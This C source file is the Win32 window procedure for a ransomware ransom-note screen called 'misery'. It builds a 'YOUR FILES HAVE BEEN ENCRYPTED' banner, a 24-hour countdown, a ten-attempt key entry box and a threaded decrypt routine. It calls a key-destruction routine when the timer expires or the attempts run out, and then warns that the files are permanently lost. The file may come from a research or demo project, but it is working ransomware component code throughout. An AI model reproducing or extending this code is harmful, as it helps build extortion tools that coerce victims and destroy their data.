#include "gui_window.h"
#include "gui_resources.h"
#include "gui_controls.h"
#include "gui_decrypt.h"
#include "gui_utils.h"

/* ====================================================================
 * RansomWndProc — main window procedure for the ransom note GUI
 * ==================================================================== */
LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    /* ================================================================
     * WM_CREATE — lay out all child controls
     * ================================================================ */
    case WM_CREATE: {
        HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);

        /* ---- BANNER AREA (0,0 – 860,170) ---- */

        /* Banner background panel */
        CreateWindowExW(0, L"STATIC", L"BANNER_BG",
            WS_CHILD | WS_VISIBLE,
            0, 0, 860, 170, hWnd, (HMENU)IDC_BANNER_BG, hInst, NULL);

        /* Lock icon emoji */
        CreateWindowExW(0, L"STATIC", L"\U0001F512",
            WS_CHILD | WS_VISIBLE,
            30, 20, 60, 50, hWnd, NULL, hInst, NULL);

        /* Headline */
        CreateWindowExW(0, L"STATIC", L"YOUR FILES HAVE BEEN ENCRYPTED",
            WS_CHILD | WS_VISIBLE,
            100, 18, 700, 40, hWnd, NULL, hInst, NULL);

        /* Subtitle */
        CreateWindowExW(0, L"STATIC",
            L"All your documents, images, databases, and source code "
            L"have been locked with AES-256 encryption.",
            WS_CHILD | WS_VISIBLE,
            100, 60, 700, 22, hWnd, NULL, hInst, NULL);

        /* Badge */
        CreateWindowExW(0, L"STATIC", L"  \u2713  ENCRYPTION COMPLETE  ",
            WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
            100, 92, 240, 28, hWnd, NULL, hInst, NULL);

        /* Timer */
        CreateWindowExW(0, L"STATIC", L"24:00:00",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);

        /* ---- INSTRUCTIONS EDIT ---- */
        const WCHAR *instructions =
            L"=========================================================\n"
            L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
            L"=========================================================\n\n"
            L"  1. DO NOT modify encrypted files yourself.\n"
            L"  2. DO NOT delete misery.key.\n"
            L"  3. Paste the 64-character KEY (second line of misery.key)\n"
            L"     into the box below and click DECRYPT FILES (or press Enter).\n"
            L"  4. You have 24 hours and 10 attempts.\n\n"
            L"  WARNING: Wrong key attempts are limited.\n"
            L"           After 10 failures the key is destroyed.";

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", instructions,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY |
            ES_AUTOVSCROLL | ES_LEFT,
            30, 185, 800, 160, hWnd, NULL, hInst, NULL);

        /* ---- CONTACT CARD (30,360 – 830,445) ---- */

        /* Card background */
        CreateWindowExW(0, L"STATIC", L"CARD_BG",
            WS_CHILD | WS_VISIBLE,
            30, 360, 800, 85, hWnd, (HMENU)IDC_CARD_BG, hInst, NULL);

        /* Card left accent bar */
        CreateWindowExW(0, L"STATIC", L"CARD_BAR",
            WS_CHILD | WS_VISIBLE,
            30, 360, 5, 85, hWnd, (HMENU)IDC_CARD_BAR, hInst, NULL);

        /* "About Author" label */
        CreateWindowExW(0, L"STATIC", L"About Author",
            WS_CHILD | WS_VISIBLE,
            50, 368, 300, 18, hWnd, NULL, hInst, NULL);

        /* Name */
        CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
            WS_CHILD | WS_VISIBLE,
            50, 392, 500, 32, hWnd, NULL, hInst, NULL);

        /* Title */
        CreateWindowExW(0, L"STATIC",
            L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
            WS_CHILD | WS_VISIBLE,
            50, 423, 500, 20, hWnd, NULL, hInst, NULL);

        /* ---- DECRYPT SECTION (30,460 – 830,590) ---- */

        /* Decrypt panel background */
        CreateWindowExW(0, L"STATIC", L"DECRYPT_PANEL",
            WS_CHILD | WS_VISIBLE,
            30, 460, 800, 130, hWnd, (HMENU)IDC_DECRYPT_PANEL, hInst, NULL);

        /* "DECRYPT YOUR FILES HERE:" label */
        CreateWindowExW(0, L"STATIC", L"DECRYPT YOUR FILES HERE:",
            WS_CHILD | WS_VISIBLE,
            45, 465, 300, 22, hWnd, NULL, hInst, NULL);

        /* "Enter the 64-char hex key..." label */
        CreateWindowExW(0, L"STATIC",
            L"Enter the 64-char hex key (or paste whole misery.key):",
            WS_CHILD | WS_VISIBLE,
            45, 490, 500, 18, hWnd, NULL, hInst, NULL);

        /* Key edit control — single-line, subclassed for Enter + paste */
        {
            HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | WS_TABSTOP,
                45, 512, 500, 32, hWnd, (HMENU)IDC_DECRYPT_KEY, hInst, NULL);
            SendMessage(hKeyEdit, EM_LIMITTEXT, 256, 0);
            if (g_hFontMono) SendMessage(hKeyEdit, WM_SETFONT, (WPARAM)g_hFontMono, TRUE);

            g_OldKeyEditProc = (WNDPROC)SetWindowLongPtrW(
                hKeyEdit, GWLP_WNDPROC, (LONG_PTR)KeyEditSubclassProc);
        }

        /* DECRYPT button — BS_OWNERDRAW */
        CreateWindowExW(0, L"BUTTON", L"DECRYPT FILES",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
            560, 510, 180, 32, hWnd, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);

        /* Status text */
        CreateWindowExW(0, L"STATIC", L"Ready. Paste key and click DECRYPT FILES.",
            WS_CHILD | WS_VISIBLE,
            45, 550, 760, 24, hWnd, (HMENU)IDC_STATUS, hInst, NULL);

        /* ---- REFERENCE / FOOTER ---- */
        WCHAR refBuf[512];
        wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
        wcscat(refBuf, L"Key File:        Desktop\\misery.key  OR  %TEMP%\\misery.key\n");
        wcscat(refBuf, L"Algorithm:       AES-256-CBC  +  HMAC-SHA256");

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", refBuf,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
            30, 605, 800, 50, hWnd, NULL, hInst, NULL);

        /* ---- BOTTOM BAR ---- */

        /* Attempts counter */
        CreateWindowExW(0, L"STATIC", L"Attempts: 0 / 10",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            30, 670, 300, 35, hWnd, (HMENU)IDC_ATTEMPTS, hInst, NULL);

        /* CLOSE button — BS_OWNERDRAW */
        CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
            680, 670, 130, 40, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);

        SetTimer(hWnd, 1, 1000, NULL);
        return 0;
    }

    /* ================================================================
     * WM_TIMER — update countdown every second
     * ================================================================ */
    case WM_TIMER: {
        if (wParam == 1) {
            UpdateTimerDisplay(hWnd);

            FILETIME ftNow;
            GetSystemTimeAsFileTime(&ftNow);
            ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

            if (now >= g_timerEndFileTime) {
                KillTimer(hWnd, 1);
                DestroyKeyAndClose(hWnd);
                return 0;
            }
        }
        return 0;
    }

    /* ================================================================
     * WM_CTLCOLORSTATIC — color all STATIC controls
     * ================================================================ */
    case WM_CTLCOLORSTATIC: {
        HDC     hdc   = (HDC)wParam;
        HWND    hCtrl = (HWND)lParam;
        WCHAR   winText[128] = {0};
        GetWindowTextW(hCtrl, winText, 128);

        /* Background panels (match by control ID) */
        if (hCtrl == GetDlgItem(hWnd, IDC_BANNER_BG)) {
            return (LRESULT)g_hbrBanner;
        }
        if (hCtrl == GetDlgItem(hWnd, IDC_CARD_BG)) {
            return (LRESULT)g_hbrCard;
        }
        if (hCtrl == GetDlgItem(hWnd, IDC_DECRYPT_PANEL)) {
            return (LRESULT)g_hbrDecryptBg;
        }
        if (hCtrl == GetDlgItem(hWnd, IDC_CARD_BAR)) {
            SetTextColor(hdc, CLR_ACCENT_DARK);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            return (LRESULT)g_hbrAccent;
        }

        /* Timer */
        if (hCtrl == GetDlgItem(hWnd, IDC_TIMER)) {
            SetTextColor(hdc, CLR_TIMER_RED);
            SetBkColor(hdc, CLR_TIMER_BG);
            SelectObject(hdc, g_hFontTimer);
            return (LRESULT)g_hbrTimerBg;
        }

        /* Attempts label */
        if (hCtrl == GetDlgItem(hWnd, IDC_ATTEMPTS)) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_BANNER_BG);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrBanner;
        }

        /* Status label */
        if (hCtrl == GetDlgItem(hWnd, IDC_STATUS)) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrBg;
        }

        /* Text-based matching for labels */
        if (wcsstr(winText, L"YOUR FILES HAVE BEEN ENCRYPTED")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontHead);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"All your documents")) {
            SetTextColor(hdc, RGB(200, 170, 170));
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontSub);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"ENCRYPTION COMPLETE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontSmall);
            return (LRESULT)g_hbrAccent;
        }

        if (wcsstr(winText, L"\U0001F512")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"Jahanzaib Ashraf Mir")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontName);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"Cybersec Engineer")) {
            SetTextColor(hdc, CLR_CARD_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"DECRYPT YOUR FILES")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"Enter the 64-char")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        if (wcsstr(winText, L"About Author")) {
            SetTextColor(hdc, CLR_CARD_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontSmall);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        /* Default */
        SetTextColor(hdc, CLR_BODY_TEXT);
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, g_hFontBody);
        return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
    }

    /* ================================================================
     * WM_CTLCOLOREDIT — color all EDIT controls
     * ================================================================ */
    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR winText[256] = {0};
        GetWindowTextW(hCtrl, winText, 256);

        /* Instructions box */
        if (wcsstr(winText, L"INSTRUCTIONS")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkColor(hdc, CLR_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrBg;
        }

        /* Reference box */
        if (wcsstr(winText, L"Reference Code:")) {
            SetTextColor(hdc, RGB(20, 60, 20));
            SetBkColor(hdc, CLR_CODE_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrCodeBg;
        }

        /* Key edit — ID-based check (works even when empty) */
        if (hCtrl == GetDlgItem(hWnd, IDC_DECRYPT_KEY)) {
            SetTextColor(hdc, RGB(0, 40, 0));
            SetBkColor(hdc, CLR_DECRYPT_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrDecryptBg;
        }

        /* Default */
        SetTextColor(hdc, CLR_BODY_TEXT);
        SetBkColor(hdc, CLR_BG);
        SelectObject(hdc, g_hFontBody);
        return (LRESULT)g_hbrBg;
    }

    /* ================================================================
     * WM_DRAWITEM — custom-drawn buttons (BS_OWNERDRAW)
     * ================================================================ */
    case WM_DRAWITEM: {
        LPDRAWITEMSTRUCT dis = (LPDRAWITEMSTRUCT)lParam;
        HDC hdc = dis->hDC;
        RECT rc = dis->rcItem;
        BOOL isDisabled = (dis->itemState & ODS_DISABLED);
        BOOL isPressed  = (dis->itemState & ODS_SELECTED);
        BOOL isHot      = (dis->itemState & ODS_HOTLIGHT);
        BOOL isFocused  = (dis->itemState & ODS_FOCUS);

        if (dis->CtlID == IDC_DECRYPT_BTN) {
            COLORREF bgColor;
            if (isDisabled)      bgColor = CLR_BTN_GREEN_DIS;
            else if (isPressed)  bgColor = CLR_BTN_GREEN_PRESS;
            else if (isHot)      bgColor = CLR_BTN_GREEN_HOVER;
            else                 bgColor = CLR_BTN_GREEN;

            HBRUSH hBrush = CreateSolidBrush(bgColor);
            FillRect(hdc, &rc, hBrush);
            DeleteObject(hBrush);
            FrameRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));

            SetTextColor(hdc, isDisabled ? RGB(200, 200, 200) : CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            DrawTextW(hdc, L"DECRYPT FILES", -1, &rc,
                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            if (isFocused && !isPressed) {
                RECT focusRc = rc;
                InflateRect(&focusRc, -3, -3);
                DrawFocusRect(hdc, &focusRc);
            }
            return TRUE;
        }

        if (dis->CtlID == IDC_CLOSE) {
            COLORREF bgColor;
            if (isPressed)  bgColor = CLR_BTN_RED_PRESS;
            else if (isHot) bgColor = CLR_BTN_RED_HOVER;
            else            bgColor = CLR_BTN_RED;

            HBRUSH hBrush = CreateSolidBrush(bgColor);
            FillRect(hdc, &rc, hBrush);
            DeleteObject(hBrush);
            FrameRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));

            SetTextColor(hdc, CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            DrawTextW(hdc, L"CLOSE", -1, &rc,
                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            if (isFocused && !isPressed) {
                RECT focusRc = rc;
                InflateRect(&focusRc, -3, -3);
                DrawFocusRect(hdc, &focusRc);
            }
            return TRUE;
        }

        return FALSE;
    }

    /* ================================================================
     * WM_COMMAND — button clicks
     * ================================================================ */
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_CLOSE) {
            DestroyWindow(hWnd);
            return 0;
        }

        if (LOWORD(wParam) == IDC_DECRYPT_BTN) {
            HWND hKeyEdit = GetDlgItem(hWnd, IDC_DECRYPT_KEY);
            HWND hStatus  = GetDlgItem(hWnd, IDC_STATUS);
            HWND hBtn     = GetDlgItem(hWnd, IDC_DECRYPT_BTN);

            if (!hKeyEdit || !hStatus || !hBtn) {
                MessageBoxA(hWnd,
                    "Internal error: decrypt controls not found.\n"
                    "Rebuild with fixed ransomnote.c",
                    "UI Error", MB_OK | MB_ICONERROR);
                return 0;
            }

            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) exceeded.\n"
                    "The key will now be destroyed.",
                    "Access Denied", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            WCHAR keyWide[300] = {0};
            GetWindowTextW(hKeyEdit, keyWide, 300);

            char keyRaw[300] = {0};
            WideCharToMultiByte(CP_UTF8, 0, keyWide, -1,
                                keyRaw, sizeof(keyRaw), NULL, NULL);

            char key[65] = {0};
            if (!NormalizeKeyInput(keyRaw, key, sizeof(key))) {
                SetWindowTextA(hStatus,
                    "Invalid key. Paste the 64-char KEY (2nd line of misery.key).");
                MessageBoxA(hWnd,
                    "Invalid key format.\n\n"
                    "misery.key looks like:\n"
                    "  <32 hex chars>   <-- salt (ignore)\n"
                    "  <64 hex chars>   <-- KEY (paste this)\n\n"
                    "Or paste the entire file contents.",
                    "Bad Key", MB_OK | MB_ICONWARNING);
                return 0;
            }

            g_decryptAttempts++;
            UpdateAttemptsDisplay(hWnd);

            EnableWindow(hBtn, FALSE);
            InvalidateRect(hBtn, NULL, TRUE);
            UpdateWindow(hBtn);

            SetWindowTextA(hStatus, "Decrypting files... please wait.");
            UpdateWindow(hStatus);

            DECRYPT_THREAD_PARAMS *params =
                (DECRYPT_THREAD_PARAMS *)malloc(sizeof(DECRYPT_THREAD_PARAMS));
            if (!params) {
                SetWindowTextA(hStatus, "Out of memory.");
                EnableWindow(hBtn, TRUE);
                InvalidateRect(hBtn, NULL, TRUE);
                return 0;
            }

            memset(params, 0, sizeof(*params));
            strncpy(params->key, key, sizeof(params->key) - 1);
            params->hWnd = hWnd;

            HANDLE hThread = (HANDLE)_beginthreadex(
                NULL, 0, DecryptThreadProc, params, 0, NULL);
            if (!hThread) {
                free(params);
                SetWindowTextA(hStatus, "Failed to start decryption thread.");
                EnableWindow(hBtn, TRUE);
                InvalidateRect(hBtn, NULL, TRUE);
                return 0;
            }
            CloseHandle(hThread);
            return 0;
        }
        break;

    /* ================================================================
     * WM_DECRYPT_DONE — posted by DecryptThreadProc
     * ================================================================ */
    case WM_DECRYPT_DONE: {
        HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
        HWND hBtn    = GetDlgItem(hWnd, IDC_DECRYPT_BTN);

        LONGLONG succeeded;
        LONGLONG failed = (LONGLONG)lParam;

        if (wParam == (WPARAM)-1) {
            succeeded = -1;
        } else {
            succeeded = (LONGLONG)wParam;
        }

        char msgBuf[512];

        if (succeeded < 0) {
            int remaining = MAX_DECRYPT_ATTEMPTS - g_decryptAttempts;
            if (remaining < 0) remaining = 0;

            snprintf(msgBuf, sizeof(msgBuf),
                "Decryption FAILED: wrong key or corrupt data. Attempts left: %d / %d",
                remaining, MAX_DECRYPT_ATTEMPTS);

            if (hStatus) SetWindowTextA(hStatus, msgBuf);

            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) reached.\n"
                    "The encryption key is now being destroyed.\n"
                    "YOUR FILES ARE PERMANENTLY LOST.",
                    "KEY DESTROYED", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            MessageBoxA(hWnd, msgBuf, "Decryption Failed", MB_OK | MB_ICONWARNING);

            /* Restore focus to key edit and select all text for retry */
            {
                HWND hKeyEdit = GetDlgItem(hWnd, IDC_DECRYPT_KEY);
                if (hKeyEdit) {
                    SetFocus(hKeyEdit);
                    SendMessage(hKeyEdit, EM_SETSEL, 0, -1);
                }
            }

            if (hBtn) {
                EnableWindow(hBtn, TRUE);
                InvalidateRect(hBtn, NULL, TRUE);
            }

        } else {
            if (failed == 0 && succeeded == 0) {
                snprintf(msgBuf, sizeof(msgBuf),
                    "No encrypted files found. Nothing to decrypt.");
            } else {
                snprintf(msgBuf, sizeof(msgBuf),
                    "Decryption complete: %lld recovered, %lld failed.",
                    succeeded, failed);
            }
            if (hStatus) SetWindowTextA(hStatus, msgBuf);
            MessageBoxA(hWnd, msgBuf, "Decryption Result", MB_OK | MB_ICONINFORMATION);
            if (hBtn) {
                EnableWindow(hBtn, TRUE);
                InvalidateRect(hBtn, NULL, TRUE);
            }
        }
        return 0;
    }

    /* ================================================================
     * WM_DESTROY — cleanup timer and quit
     * ================================================================ */
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hWnd, msg, wParam, lParam);
}